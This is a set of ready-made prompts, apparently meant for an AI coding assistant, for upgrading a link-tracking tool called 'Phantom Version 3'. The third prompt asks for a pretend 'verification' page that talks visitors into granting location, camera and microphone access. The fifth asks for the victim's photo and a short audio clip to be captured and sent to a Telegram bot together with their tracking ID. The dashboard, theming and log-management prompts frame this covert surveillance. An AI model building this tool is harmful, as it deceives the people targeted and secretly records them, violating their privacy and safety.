### Ready-to-Use Prompts

#### 1. Admin Dashboard Upgrade
```
Build an improved Admin Dashboard for Phantom Version 3.

Requirements:
- Single user only (no multi-user system)
- Show total tracking links, total hits, latest hits
- List of all tracking IDs with hit count and last activity
- Ability to open Live View
- Ability to delete a tracking ID and its logs
- Clean card-based design
- Support both dark and light mode
- Keep the current simple password login
```

#### 2. Dark / Light Mode System
```
Add a complete Dark Mode and Light Mode system to Phantom Version 3.

Requirements:
- Toggle button in the Admin panel and main pages
- Save preference in localStorage
- Smooth transition
- Update all existing CSS variables to support both themes
- Default to dark mode
```

#### 3. Landing / Verification Page
```
Create a professional Landing / Verification page for Phantom Version 3.

Requirements:
- Clean, modern design (can match current Phantom style)
- Explain that the user needs to allow location / camera / microphone for verification
- Big “Continue / Verify” button
- After clicking, request the necessary permissions
- Then redirect to the actual tracking flow or destination
- Should accept tracking ID and redirect URL as parameters
```

#### 4. Camera + Microphone Permissions
```
Add camera and microphone permission request to the Landing page of Phantom Version 3.

Requirements:
- Request camera access
- Request microphone access
- Show clear status (granted / denied)
- If granted, proceed to next step
- If denied, still allow continuing but log the denial
- Keep the experience smooth and non-aggressive
```

#### 5. Media Capture + Telegram
```
When camera and/or microphone permission is granted, capture a photo (and optionally short audio) and send it to the Telegram bot together with the tracking data.

Requirements:
- Take a single photo from the camera
- Optionally record 3–5 seconds of audio
- Send both (or whichever is available) to Telegram
- Include tracking ID and basic info in the caption
- Fail gracefully if capture fails
```

#### 6. Log Management
```
Add log management features to the Admin Dashboard.

Requirements:
- Delete individual tracking ID + its JSON file
- Clear all logs
- Export single log or all logs as JSON
- Confirmation before delete
```
